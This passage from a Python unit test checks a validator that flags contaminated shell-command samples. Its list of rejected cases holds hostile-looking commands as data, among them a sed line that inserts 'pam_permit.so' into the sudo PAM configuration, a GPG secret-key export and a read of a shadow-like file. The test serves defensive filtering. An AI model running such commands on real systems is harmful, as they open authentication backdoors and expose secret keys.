        ("/tmp/testbench $ gitleaks detect --source=/tmp/testbench --no-git", "gitleaks"),
        ("root date -f /tmp/secret_shadow '+%Y'", "date"),
        ("chown -R a:a /x\n# Wait, the task requires a shell that stays open.", "chown"),
        ("# Risky tar:\ntar -xpf a.tar", "tar"),
        ("# CWD: /etc/pam.d\nsed -i '1i auth required pam_permit.so' sudo", "sed"),
        ("/var/tmp/a.ini: file 0644 root:root, content \"m=1\"\n\nchown -L -R s:s /var/tmp/a", "chown"),
        ("# /tmp/r.reg: type=file, content=\"k=v\"\ngrep k /tmp/r.reg", "grep"),
        ("extract archive preserving all metadata\ntar -xpf a.tar", "tar"),
        ("alpha/core\nbeta/lib\nsudo fzf --query beta", "fzf"),
        ("user= tester\ncwd=/tmp/v\nvim -Es -c 'qa!' f", "vim"),
        ("/tmp/gpg_bench/dir gpg --homedir /tmp/gpg_bench/dir --export-secret-keys", "gpg"),
    ]
    GOOD = [
        ("python3 -c 'import os\n# 1. Read config\nprint(os.getcwd())'", "python3"),
        ("# [app]\n# mode=prod\npatch -s -p0 < fix.diff", "patch"),
        ("/usr/local/bin/tool --check", "tool"),
        ("sudo -n -l /home/user/bin/svc", "sudo"),
        ("bash -c 'for f in *.log; do gzip \"$f\"; done'", "bash"),
    ]

    def test_bad_rejected(self):
        for cmd, util in self.BAD:
            self.assertTrue(validate.contamination(cmd, util), cmd)

    def test_good_kept(self):
        for cmd, util in self.GOOD:
            self.assertEqual(validate.contamination(cmd, util), [], cmd)
